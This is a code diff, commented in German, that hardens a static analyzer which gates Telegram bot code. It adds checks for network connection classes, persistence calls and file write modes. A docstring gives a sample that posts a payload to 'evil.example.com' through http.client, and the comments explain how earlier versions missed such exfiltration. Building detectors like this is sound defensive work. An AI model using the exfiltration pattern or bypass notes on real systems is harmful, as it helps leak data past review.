@@ -26,6 +26,7 @@ import ast
 import hashlib
 import json
 import logging
+import os
 import re
 import secrets
 import time
@@ -76,6 +77,11 @@ FORBIDDEN_IMPORTS = frozenset(
         "redis", "pymongo", "boto3", "botocore", "psycopg2", "pymysql",
         "elasticsearch", "kafka", "sqlalchemy", "csv", "xlwt", "openpyxl",
         "tempfile", "importlib", "shutil", "builtins",
+        # v2.13.0: `urllib3` ist der Pool, auf dem `requests` sitzt — und der
+        # erste Weg, den BK004 (Exfiltrations-Blocker) umgehen konnte. Mit
+        # `urllib3.PoolManager().request(url, ...)` ist der Receiver ein
+        # `ast.Call`, `_dotted` liefert "" und der Aufruf blieb ungeprueft.
+        "urllib3",
     }
 )
 
@@ -86,7 +92,35 @@ ALLOWED_HTTP_HOSTS = ("api.telegram.org",)
 HTTP_CALL_NAMES = frozenset({"get", "post", "put", "patch", "delete", "request", "urlopen"})
 
 #: Modulwurzeln, deren HTTP-Aufrufe URL-geprüft werden müssen (nach Alias-Auflösung).
-HTTP_MODULE_ROOTS = frozenset({"requests", "httpx", "urllib", "http", "aiohttp"})
+HTTP_MODULE_ROOTS = frozenset({"requests", "httpx", "urllib", "urllib3", "http", "aiohttp"})
+
+#: Klassen, die eine **Verbindung** zu einem Host aufbauen, ohne dass der
+#: Modulpfad im Aufrufnamen auftaucht (v2.13.0 — BK004-Bypass).
+#:
+#: BK004 prüft nur Aufrufe, deren aufgelöster Name auf einen HTTP-Methoden-
+#: Namen *und* eine bekannte Modulwurzel zeigt. Bei diesen Klassen ist der
+#: Aufruf ``c.request(...)`` bzw. ``pool.request(...)`` — der Receiver heisst
+#: beliebig, die Modulwurzel ist im Namen nicht mehr sichtbar. In v2.12.0 lief
+#: das durch:
+#:
+#:     import http.client
+#:     c = http.client.HTTPSConnection("evil.example.com")   # nicht erfasst
+#:     c.request("POST", "/collect", body=payload)           # Ziel nie geprüft
+#:
+#: und ``botctl review`` meldete "keine Befunde". Der Konstruktor-Aufruf
+#: selbst wird deshalb geprüft (siehe ``_CONNECTION_CLASSES`` /
+#: ``_check_http_target``), denn dort steht das Ziel im String-Argument.
+_CONNECTION_CLASSES = frozenset(
+    {
+        "HTTPConnection",
+        "HTTPSConnection",
+        "AsyncHTTPConnection",
+        "PoolManager",
+        "ProxyManager",
+        "HTTPConnectionPool",
+        "HTTPSConnectionPool",
+    }
+)
 
 #: Namen, hinter denen in Logs typischerweise Nachrichteninhalte stecken.
 SENSITIVE_LOG_NAMES = frozenset(
@@ -104,6 +138,31 @@ PERSISTENCE_CALLS = frozenset(
         "insert_many", "put_object", "remove", "unlink", "rmtree", "makedirs",
     }
 )
+
+#: Wurzeln, für die ein ``PERSISTENCE_CALLS``-Treffer **persistenzverdächtig**
+#: ist (v2.13.0). Ohne diese Einschränkung meldete v2.12.0 auch die Builtins
+#: ``set()``, ``remove()`` und ``save()`` als BLOCKER — ``seen = set()`` allein
+#: stoppte jedes Review. Siehe Kommentar in ``visit_Call``.
+_PERSISTENCE_ROOTS = frozenset(
+    {
+        # Dateisystem
+        "pathlib", "os", "io", "shutil", "tempfile", "path",
+        # Datenbanken / Stores
+        "sqlite3", "redis", "shelve", "pickle", "marshal", "sqlalchemy",
+        "psycopg2", "pymysql", "pymongo", "elasticsearch", "boto3", "botocore",
+        # Datenformate mit Schreib-API
+        "pandas", "numpy", "openpyxl", "xlwt", "csv", "json",
+        # HTTP-Client mit Sitzungs-/Cache-Persistenz
+        "requests", "httpx", "urllib3", "aiohttp",
+    }
+)
+
+#: Namen aus :data:`PERSISTENCE_CALLS`, die **auch** gewöhnliche
+#: Container-/Objektmethoden bezeichnen. Bei nicht auflösbarem Empfänger sind
+#: sie nicht entscheidbar und werden als BK010 („nicht prüfbar") gemeldet
+#: statt als BK002 (persistenzverdächtig) — sonst wäre `results.remove(x)` ein
+#: Blocker. v2.13.0.
+_AMBIGUOUS_PERSISTENCE_NAMES = frozenset({"set", "remove", "save", "dump"})
 
 #: Dynamische Code-Ausführung / Deserialisierung.
 DYNAMIC_EXEC_CALLS = frozenset({"eval", "exec", "compile", "__import__", "loads"})
@@ -272,6 +331,12 @@ class _ModuleFacts:
     name_paths: dict[str, str] = field(default_factory=dict)
     #: einfach zugewiesene Modul-Konstanten (Name → Stringwert)
     str_consts: dict[str, str] = field(default_factory=dict)
+    #: lokaler Name → (Klasse, aufgelöster Host oder None)
+    #: (``c`` → ``("HTTPSConnection", "evil.example.com")``). v2.13.0 / BK004:
+    #: der Ziel-Host steckt beim Konstruktor im Argument, nicht in den
+    #: Folgeaufrufen, daher müssen beide Stellen geprueft werden. `None` heisst
+    #: "nicht statisch auflösbar".
+    connection_handles: dict[str, tuple[str, str | None]] = field(default_factory=dict)
 
 
 def collect_facts(tree: ast.Module) -> _ModuleFacts:
@@ -308,16 +373,53 @@ def collect_facts(tree: ast.Module) -> _ModuleFacts:
             elif isinstance(node.value, ast.Call):
                 dotted = _dotted(node.value.func)
                 tail = dotted.rsplit(".", 1)[-1]
+                head = dotted.split(".", 1)[0]
+                # from-import auflösen (`from pathlib import Path` → `pathlib`)
+                mapped = facts.name_paths.get(head) or facts.root_aliases.get(head) or head
                 if tail in {"Session", "Client", "AsyncClient"} and "." in dotted:
-                    root = facts.root_aliases.get(dotted.split(".", 1)[0], dotted.split(".", 1)[0])
+                    root = facts.root_aliases.get(head, head)
                     for t in node.targets:
                         if isinstance(t, ast.Name):
                             facts.root_aliases[t.id] = root
+                elif mapped.split(".", 1)[0].lower() in _PERSISTENCE_ROOTS:
+                    # v2.13.0: `p = Path(x)` → `p.unlink()` ist genauso ein
+                    # Dateizugriff wie `Path(x).unlink()`. Ohne diese Zuordnung
+                    # blieb der Empfänger `p` unauflösbar und der Schreibzugriff
+                    # wurde (nach der Präzisionskorrektur) gar nicht gemeldet.
+                    for t in node.targets:
+                        if isinstance(t, ast.Name):
+                            facts.root_aliases[t.id] = mapped
+                elif tail in _CONNECTION_CLASSES and "." in dotted:
+                    # v2.13.0: `c = http.client.HTTPSConnection(host)`. Der
+                    # Ziel-Host steckt im Konstruktor-Argument, nicht in den
+                    # späteren `c.request(...)`-Aufrufen. Hier wird die
+                    # Host-Pruefung des Konstruktors vorbereitet; die
+                    # Auswertung des Folgeaufrufs erfolgt in `visit_Call`.
+                    host = _literal_host(node.value)
+                    for t in node.targets:
+                        if isinstance(t, ast.Name):
+                            facts.connection_handles[t.id] = (tail, host)
         elif isinstance(node, ast.AnnAssign) and isinstance(node.value, ast.Constant) \
                 and isinstance(node.value.value, str) and isinstance(node.target, ast.Name):
             if store_counts.get(node.target.id, 0) == 1:
                 facts.str_consts[node.target.id] = node.value.value
     return facts
+
+
+def _literal_host(call: ast.Call) -> str | None:
+    """Erster String-Argumentwert eines Konstruktor-Aufrufs, als Hostname.
+
+    Nur für die Verbindungs-Klassen aus :data:`_CONNECTION_CLASSES`
+    (``HTTPSConnection("host")``, ``PoolManager("host")``) — dort ist das erste
+    Argument der Host, keine URL. ``None``, wenn es kein auflösbares Literal
+    ist; der Aufrufer behandelt das als „nicht prüfbar" (BK010).
+    """
+    if not call.args:
+        return None
+    first = call.args[0]
+    if isinstance(first, ast.Constant) and isinstance(first.value, str):
+        return first.value.strip().split("/")[0].split(":")[0] or None
+    return None
 
 
 def _has_write_flags(expr: ast.AST) -> bool:
@@ -359,6 +461,15 @@ class _SecurityVisitor(ast.NodeVisitor):
             root = alias.name.split(".", 1)[0]
             if root in FORBIDDEN_IMPORTS:
                 self._add("BK001", node, f"Import von '{alias.name}' ist nicht erlaubt.")
+            # v2.13.0: Asymmetrie geschlossen. `from random import choice` ergab
+            # BK012, ein schlichtes `import random` fiel in v2.12.0 an dieser
+            # Stelle durch und wurde erst am Aufrufort (`random.random()`)
+            # erwischt — dort greift die Regel nur bei `root == "random"`, was
+            # ein Alias (`import random as rnd`) ebenfalls aushebelte.
+            if root == "random":
+                self._add(
+                    "BK012", node, "'random' ist kryptographisch unsicher — 'secrets' nutzen."
+                )
         self.generic_visit(node)
 
     def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
@@ -371,9 +482,25 @@ class _SecurityVisitor(ast.NodeVisitor):
 
     # -- Zuweisungen (hartkodierte Secrets) ---------------------------------
     def _check_secret_literal(self, node: ast.AST, literal: str, targets: str) -> None:
+        """BK006 für hartkodierte Geheimnisse in einer Zuweisung.
+
+        v2.13.0: der Token-Zweig ist **entfernt**. ``visit_Constant`` meldet
+        jedes tokenförmige Literal bereits an derselben Zeile, und
+        ``visit_Assign`` ruft danach ``generic_visit`` auf, das ``visit_Constant``
+        für denselben Knoten erneut durchläuft. Ein hartkodiertes Token
+        erzeugte dadurch **zwei** BK006-Befunde — und weil
+        ``ReviewGate.submit`` ``[f"{f.rule_id}@{f.line}" for f in
+        report.findings`` protokolliert, lagen die Duplikate dauerhaft im
+        Audit-Trail. Die Blocker-Zahl war also aufgebläht: zwei Probleme
+        ergaben vier Befunde.
+
+        Diese Methode meldet jetzt nur noch den Fall, den ``visit_Constant``
+        nicht sieht: ein **Geheimnis ohne Token-Form** an einer sprechenden
+        Zielvariable (``API_KEY = "sk-abc"``, ``password = "geheim"``).
+        """
         if _TOKEN_EMBEDDED.search(literal):
-            self._add("BK006", node, "Bot-Token im Quelltext hartkodiert.")
-        elif any(key in targets for key in ("token", "secret", "api_key", "password")):
+            return  # visit_Constant meldet das bereits — genau einmal.
+        if any(key in targets for key in ("token", "secret", "api_key", "password")):
             self._add("BK006", node, f"Geheimnis als Literal an '{targets.strip()}'.")
 
     def visit_Assign(self, node: ast.Assign) -> None:
@@ -415,6 +542,66 @@ class _SecurityVisitor(ast.NodeVisitor):
             return raw_name
         return f"{mapped}.{rest}" if rest else mapped
 
+    def _receiver_root(self, node: ast.Call) -> str:
+        """Wurzel des **Empfängers** eines Attribut-Aufrufs, sonst ``""``.
+
+        v2.13.0. `_dotted` liefert bei ``Path("x").write_text(d)`` nur
+        ``"write_text"`` — der Empfänger ist ein ``ast.Call``, kein
+        ``ast.Name``/``ast.Attribute``, und fällt damit aus der Auflösung. Der
+        Methodenname allein trägt aber keine Information über die Zielklasse:
+        ``write_text`` schreibt auf die Platte (Pathlib), ``result.remove(x)``
+        entfernt aus einer Liste.
+
+        Deshalb wird der Empfänger separat aufgelöst:
+        * ``ast.Name``     → ``root_aliases`` (Import-/Alias-Tabelle)
+        * ``ast.Call``     → dessen ``func`` auflösen (``Path(...)`` →
+          ``pathlib.Path``)
+        * ``ast.Attribute`` → dessen Wurzel
+
+        Ergebnis ist die **Wurzel**, niedrigergeschrieben, damit
+        ``_PERSISTENCE_ROOTS`` direkt verglichen werden kann. ``""`` heißt
+        „nicht auflösbar" — dann entscheidet :meth:`_report_unverifiable_writes`.
+        """
+        func = node.func
+        if not isinstance(func, ast.Attribute):
+            return ""
+        target = func.value
+        if isinstance(target, ast.Call):
+            target = target.func
+        raw = _dotted(target)
+        if not raw:
+            return ""
+        return self._resolve_call_name(raw).split(".")[0].lower()
+
+    def _report_unverifiable_writes(self, node: ast.Call, name: str) -> None:
+        """BK010 für Schreibaufrufe mit nicht auflösbarem Empfänger.
+
+        ``client.remove(id)``, ``cfg.save()``, ``store.set(k, v)`` — der
+        Empfänger ist ein lokales Objekt, dessen Typ statisch nicht feststeht.
+        Solche Aufrufe meldet v2.13.0 **nicht** mehr als BK002 (Blocker): das
+        wäre der Normalfall in jedem normalen Python und damit eine Regel, die
+        man umgeht. Sie werden stattdessen als „nicht prüfbar" (BK010)
+        ausgewiesen — dieselbe Trennung, die die HTTP-Regeln seit langem
+        fahren. Für das Review bleibt beides ein Blocker, aber die Meldung
+        sagt jetzt, was tatsächlich unklar ist.
+        """
+        short = name.rsplit(".", 1)[-1]
+        if short not in _AMBIGUOUS_PERSISTENCE_NAMES:
+            return
+        # `connect` ist bereits durch die Ausnahme oben abgedeckt (Signal- und
+        # Event-Handler sind die Normalfälle) und `dump`/`set`/`save`/`remove`
+        # ohne Attribut-Empfänger wären Builtins ohne Ziel.
+        if not isinstance(node.func, ast.Attribute):
+            return
+        self._add(
+            "BK010",
+            node,
+            f"'{name}' hat einen nicht statisch auflösbaren Empfänger — "
+            f"Schreibzugriff nicht prüfbar. Ist es ein Container "
+            f"(dict/set/list/eigenes Objekt), kurz begründen oder auf ein "
+            f"eindeutig benanntes Handle umstellen.",
+        )
+
     def visit_Call(self, node: ast.Call) -> None:
         name = self._resolve_call_name(_dotted(node.func))
         short = name.split(".")[-1] if name else ""
@@ -450,12 +637,41 @@ class _SecurityVisitor(ast.NodeVisitor):
         if root in {"os", "subprocess"} and short in SHELL_CALLS:
             self._add("BK007", node, f"Prozess-/Shell-Aufruf '{name}' ist untersagt.")
 
-        # Persistenz
+        # Persistenz.
+        #
+        # v2.13.0 Präzisionskorrektur: `PERSISTENCE_CALLS` wird gegen den
+        # **letzten** Namensbestandteil (`short`) geprüft. `set`, `remove` und
+        # `save` sind aber genauso Builtin-/Container-Methoden — `set()`,
+        # `seen = set()`, `results.remove(x)` und `config.save()` wurden als
+        # **BLOCKER** gemeldet. Damit konnte ein völlig legitimer `set()`
+        # allein jedes Review stoppen und die Blocker-Zahl gegen die
+        # tatsächlichen Probleme aufblähen (das höffliche Verhalten — false
+        # positives entmutigen).
+        #
+        # Korrekt ist: nur melden, wenn der Aufruf an einen **bekannten
+        # Container** gebunden ist (persistenzverdächtige Wurzel) oder wenn
+        # gar keine Wurzel auflösbar ist (dann bleibt es vorsichtig gemeldet).
         if short in PERSISTENCE_CALLS and not name.startswith(("audit", "logging")):
-            if short in {"connect"} and root != "sqlite3":
+            receiver = self._receiver_root(node)
+            if short == "connect" and receiver != "sqlite3":
                 pass  # connect() allein ist kein Verstoß (z. B. signals)
-            else:
+            elif receiver in _PERSISTENCE_ROOTS:
+                # Empfänger auf einen bekannten persistenzverdächtigen Typ
+                # aufgelöst — das ist der eigentliche Verstoß. Der Fall ist
+                # entschieden; ein „nicht prüfbar" (BK010) wäre doppelt.
                 self._add("BK002", node, f"Schreibzugriff via '{name}' ist untersagt.")
+                return
+            # v2.13.0: sonst **kein** BK002. v2.12.0 meldete jeden Treffer
+            # gegen `PERSISTENCE_CALLS` als BLOCKER, und die Menge wird gegen
+            # den letzten Namensbestandteil geprüft. Damit waren `set()`,
+            # `results.remove(x)` und `cfg.save()` Blocker — `seen = set()`
+            # stoppte jedes Review. Der Methodenname allein sagt nichts über
+            # die Zielklasse aus: `.remove()` entfernt aus einer Liste,
+            # `.save()` speichert ein Konfigurationsobjekt, `.set()` schreibt
+            # in Redis. Ohne auflösbaren Empfänger ist der Fall nicht
+            # entscheidbar — und dafür hat das Modul bereits eine eigene
+            # Regel: BK010, getrennt von BK002.
+            self._report_unverifiable_writes(node, name)
         if short == "open":
             mode = ""
             if len(node.args) > 1 and isinstance(node.args[1], ast.Constant):
@@ -463,7 +679,18 @@ class _SecurityVisitor(ast.NodeVisitor):
             for kw in node.keywords:
                 if kw.arg == "mode" and isinstance(kw.value, ast.Constant):
                     mode = str(kw.value.value)
-            if any(flag in mode for flag in ("w", "a", "x")):
+            # v2.13.0: **Positivliste** statt Verbotsliste.
+            #
+            # v2.12.0 prüfte `any(flag in mode for flag in ("w", "a", "x"))`.
+            # Damit blieb `open(p, "r+")` unentdeckt — `+` heisst lesen UND
+            # schreiben, das Handle ist voll beschreibbar. Die Regel ist jetzt:
+            # geschrieben wird, was **nicht ausschließlich lesend** ist.
+            #
+            # `open(p)` ohne mode-Argument ist laut Python-Doku äquivalent zu
+            # `open(p, "r")` — der leere Modus muss darum als Lesemodus gelten
+            # (v2.12.0 prüfte ihn korrekt, weil `""` keinen der Flags enthält).
+            read_only = mode == "" or (set(mode) <= {"r", "b", "t"} and "r" in mode)
+            if not read_only:
                 self._add("BK002", node, f"Datei wird zum Schreiben geöffnet (mode='{mode}').")
 
         # os.open/io.open mit Schreib-Flags sowie os.write/os.pwrite — R-2:
@@ -490,6 +717,34 @@ class _SecurityVisitor(ast.NodeVisitor):
         # HTTP-Aufrufe: Ziel-Host prüfen (nach Alias-Auflösung, H-1)
         if short in HTTP_CALL_NAMES and root in HTTP_MODULE_ROOTS:
             self._check_http_target(node, name)
+        elif short in HTTP_CALL_NAMES and root in self.facts.connection_handles:
+            # v2.13.0 / BK004: `c = http.client.HTTPSConnection(host)` gefolgt
+            # von `c.request(...)`. Der Receiver heisst beliebig, die Modulwurzel
+            # ist im Aufrufnamen nicht mehr sichtbar — der Aufruf lief in
+            # v2.12.0 an der Pruefung vorbei, weil `root` == "c" war, und
+            # `botctl review` meldete "keine Befunde".
+            #
+            # Der Host wurde bereits am Konstruktor geprueft. Bleibt nur der
+            # Hinweis, wenn er *nicht* auflösbar war: dann ist auch dieser
+            # Aufruf nicht verifizierbar und muss als BK010 auffallen.
+            kind, host = self.facts.connection_handles[root]
+            if host is None or not any(
+                host == allowed or host.endswith(f".{allowed}") for allowed in ALLOWED_HTTP_HOSTS
+            ):
+                self._add(
+                    "BK010",
+                    node,
+                    f"HTTP-Aufruf über ein Verbindungs-Handle ({kind}) — "
+                    f"Ziel-Host nicht prüfbar; nur "
+                    f"{', '.join(ALLOWED_HTTP_HOSTS)} ist erlaubt.",
+                )
+        elif short in _CONNECTION_CLASSES and root in HTTP_MODULE_ROOTS:
+            # v2.13.0 / BK004: der Konstruktor selbst. Das Argument ist ein
+            # nackter Hostname, keine URL — daher `host_is_bare_host=True`,
+            # sonst haette `urlparse("evil.example.com").hostname` leer
+            # geliefert und die Meldung "kein Host erkennbar" statt des
+            # präzisen BK004 mit dem echten Namen.
+            self._check_http_target(node, name, host_is_bare_host=True)
 
         # Logging / Ausgaben mit Inhalten (Root case-insensitiv, seit v2.11.1:
         # `LOGGER = logging.getLogger(...)` ist die übliche Konvention und
@@ -531,7 +786,14 @@ class _SecurityVisitor(ast.NodeVisitor):
             return "".join(prefix) if prefix else None
         return None
 
-    def _check_http_target(self, node: ast.Call, name: str) -> None:
+    def _check_http_target(
+        self,
+        node: ast.Call,
+        name: str,
+        *,
+        host_arg: int = 0,
+        host_is_bare_host: bool = False,
+    ) -> None:
         """Nur api.telegram.org darf per HTTP kontaktiert werden.
 
         Audit H-1: Vorher zählten nur Literal-Argumente — eine URL in einer
@@ -540,19 +802,33 @@ class _SecurityVisitor(ast.NodeVisitor):
         wirklich unauflösbare Ziele sind BK010 — seit v2.4.0 ein BLOCKER
         (R-2): ein nicht prüfbares Ziel ist nicht „sicher“, sondern nur
         nicht verifizierbar.
+
+        :param host_arg: Position des Arguments, das den Host nennt.
+        :param host_is_bare_host: ``True``, wenn das Argument ein **nackter
+            Hostname** ist und keine URL (v2.13.0: ``HTTPSConnection("host")``
+            und ``PoolManager("host")``). ``urlparse("evil.example.com")``
+            liefert ``hostname == None`` — der Aufruf wäre also als "kein Host
+            erkennbar" (BK010) abgewiesen worden, statt präzise als BK004 mit
+            dem echten Namen. Beides ist ein Blocker, die Meldung wäre aber
+            irreführend und ein *erlaubter* Host hätte denselben Code
+            durchlaufen.
         """
         target = None
-        if node.args:
-            target = self._fold_string(node.args[0])
+        if len(node.args) > host_arg:
+            target = self._fold_string(node.args[host_arg])
         if target is None:
             for kw in node.keywords:
-                if kw.arg == "url":
+                if kw.arg in {"url", "host"}:
                     target = self._fold_string(kw.value)
                     break
         if target is None:
             self._add("BK010", node, f"Ziel-URL von '{name}' ist nicht statisch prüfbar.")
             return
-        host = urlparse(target).hostname or ""
+        if host_is_bare_host:
+            # Kein Schema, kein Pfad: der Wert IST der Host.
+            host = target.strip().split("/")[0].split(":")[0]
+        else:
+            host = urlparse(target).hostname or ""
         if not host:
             # Konstanter Präfix ohne Host (z. B. f"https://{var}/…") oder
             # relatives Ziel: prüfbar nur, wenn der Host Teil des Präfix war.
@@ -800,12 +1076,29 @@ class ReviewLedger:
         Inhalte oder Tokens zu berühren.
         """
         target = Path(path)
+        # v2.13.0: **atomar** schreiben (Temp-Datei + os.replace).
+        #
+        # `write_text` öffnet mit "w" und **kürzt damit sofort**. Der `flock` in
+        # `_ledger_transaction` verhindert gleichzeitige *Schreiber*, sagt aber
+        # nichts über einen Abbruch, eine volle Platte oder einen Stromausfall
+        # zwischen dem Kürzen und dem letzten Byte. Danach ist der Trail
+        # unbrauchbar, `load()` meldet "ist beschädigt" — und mit ihm sind
+        # **alle** aufgezeichneten Freigaben verloren (fail-closed, also kein
+        # Sicherheitsloch, aber der komplette Review-Workflow steht).
+        #
+        # `os.replace` ist auf POSIX und Windows atomar: Leser sehen entweder
+        # den alten oder den neuen Inhalt, nie einen halben.
+        tmp = target.with_name(target.name + ".tmp")
         try:
             target.parent.mkdir(parents=True, exist_ok=True)
-            target.write_text(
+            tmp.write_text(
                 json.dumps(self.audit_trail(), indent=2, sort_keys=True) + "\n", encoding="utf-8"
             )
+            os.replace(tmp, target)
         except OSError as exc:
+            # Aufgeräumt hinterlassen: eine liegengebliebene .tmp-Datei würde beim
+            # nächsten Lauf als "schon vorhanden" fehlinterpretiert.
+            tmp.unlink(missing_ok=True)
             raise ReviewError(
                 f"Audit-Trail '{path}' ist nicht schreibbar ({exc.__class__.__name__})."
             ) from None
@@ -921,20 +1214,44 @@ class ReviewGate:
         """Statische Analyse ohne Nebenwirkungen (Report, kein Raise)."""
         return analyze_source(path)
 
-    def submit(self, bot_id: int, path: str | Path) -> ReviewTicket:
+    def submit(
+        self,
+        bot_id: int,
+        path: str | Path,
+        *,
+        report: ReviewReport | None = None,
+    ) -> ReviewTicket:
         """
         Reicht eine Bot-Datei zum Review ein.
 
         Blocker der statischen Analyse stoppen den Vorgang sofort — es gibt
         keinen „Trotzdem freigeben"-Pfad (stattdessen gezielte
         ``# botkit:allow``-Suppressions mit Begründung im Code).
+
+        :param report: Optional ein bereits berechneter Report (z. B. von
+            :meth:`analyze`). v2.13.0: ohne diesen Parameter las ``submit`` die
+            Datei ein **zweites** Mal und analysierte sie erneut — doppelte
+            Lese- und Parsevorgänge, und zwischen beiden Lesevorgängen konnte
+            jemand die Datei ändern, sodass am Bildschirm ein Report erschien,
+            für den nie ein Ticket existierte.
+
+        .. important:: Die Ticket-Bindung läuft über :func:`source_sha256`, also
+           über die **Bytes auf der Platte** — bewusst *nicht* über
+           ``report.source_sha256``, das über den dekodierten Text gebildet wird
+           (``read_text`` normalisiert CRLF zu LF). v2.12.0 reichte letzteres
+           ein, :meth:`verify` prüfte aber die Byte-Prüfsumme: bei einem
+           CRLF-Checkout (``core.autocrlf``, Windows, einzelne ``\\r``) waren
+           die beiden Werte nie gleich und die Freigabe damit dauerhaft
+           unmöglich — mit einer Fehlermeldung, die auf ``botctl review``
+           verwies und damit nicht weiterhalf.
         """
-        report = self.analyze(path)
+        if report is None:
+            report = self.analyze(path)
         if not report.ok:
             raise ReviewGateError(report.as_text())
         return self._ledger.submit(
             bot_id,
-            report.source_sha256,
+            source_sha256(path),
             file=str(path),
             static_findings=[f"{f.rule_id}@{f.line}" for f in report.findings],
         )
